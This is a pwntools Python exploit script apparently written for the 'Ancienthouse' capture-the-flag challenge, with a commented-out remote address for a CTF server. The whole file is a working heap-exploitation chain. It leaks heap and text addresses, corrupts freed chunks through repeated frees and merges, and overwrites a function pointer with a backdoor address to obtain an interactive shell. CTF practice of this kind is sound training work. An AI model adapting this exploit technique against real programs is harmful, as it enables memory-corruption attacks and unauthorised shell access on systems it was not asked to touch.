# -*- coding: utf-8 -*-

#########################################################################
# File Name: exp.py
# Created on : 2021-08-13 23:01:02
# Author: r1mit
# Last Modified: 2021-08-18 08:30:47
# Description:
#########################################################################
from pwn import *

context.terminal=['tmux', 'splitw', '-h']
#  context.log_level="debug";
p = process("./Ancienthouse")
#  p = remote("pwn.challenge.bi0s.in", 1230)
def add(size, name):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("size : ")
    p.sendline(str(size))
    p.recvuntil("name :")
    p.send(name)
  
def battle(idx):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("id : ")
    p.sendline(str(idx))

def merge(idx1, idx2):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("id 1: ")
    p.sendline(str(idx1))
    p.recvuntil("id 2: ")
    p.sendline(str(idx2))


def main():
    p.sendline('a')
    add(0x20, "a"*0x20) # 0 , add chunk with null byte will leak next chunk(the 1st)'s name ptr
    add(0x20, '/bin/sh\x00') # 1
    #  gdb.attach(p)

    # leak 1st chunk's name ptr by reading 0's chunks name
    battle(0)
    p.recvuntil('a'*0x20)
    #  p.interactive();
    leak_heap = u64(p.recvuntil(" ....")[:-5].ljust(8, '\x00'))
    print("[+] leak heap: "+hex(leak_heap))
    target_heap = leak_heap - 0x2040 # target heap is function_ptr chunk
    print("[+] target heap: "+hex(target_heap))
    

    # alloc 0x10 size chunk
    add(0x10, 'a'*0x10); #  2

    # free the 0 chunk
    for i in range(6):
        battle(0)
    p.recvuntil(">>")
    p.sendline("1")


    add(0x20, 'a'*0x1f+'\x00') # 3 the same as 0, make the last byte to null to make merge copy_name successfully.
    # free it again
    for i in range(7):
        battle(3)       
    p.recvuntil(">>")
    p.sendline("1")
   
    # alloc another 0x10 size chunk
    add(0x10, 'a'+p64(target_heap)+p32(0x41)) # 4

    merge(2, 4) # merge 2 0x10 chunk will alloc 0x20 chunk(mem is the same as 0) and overwite 1st chunk's name ptr to function_ptr chunk
    battle(1)

    # now we can leak function ptr by reading 1st chunk's name
    p.recvuntil("battle with ")
    leak_text = u64(p.recvuntil(" ....")[:-5].ljust(8, '\x00'))
    print("[+] leak text: "+hex(leak_text))
    text_base = leak_text-0x1b82
    backdoor_addr = text_base+0x1170

    # this will free function_ptr chunk ptr
    for i in range(4):
        battle(1)
    p.recvuntil(">>")
    p.sendline("1")

    # alloc function_ptr out and change the function to system
    add(0x50, p64(backdoor_addr)+p64(leak_heap))

    # then get shell
    print("[+] get shell")
    p.recvuntil(">> ")
    p.sendline("4")
    p.interactive();

if __name__ == "__main__":
    main()
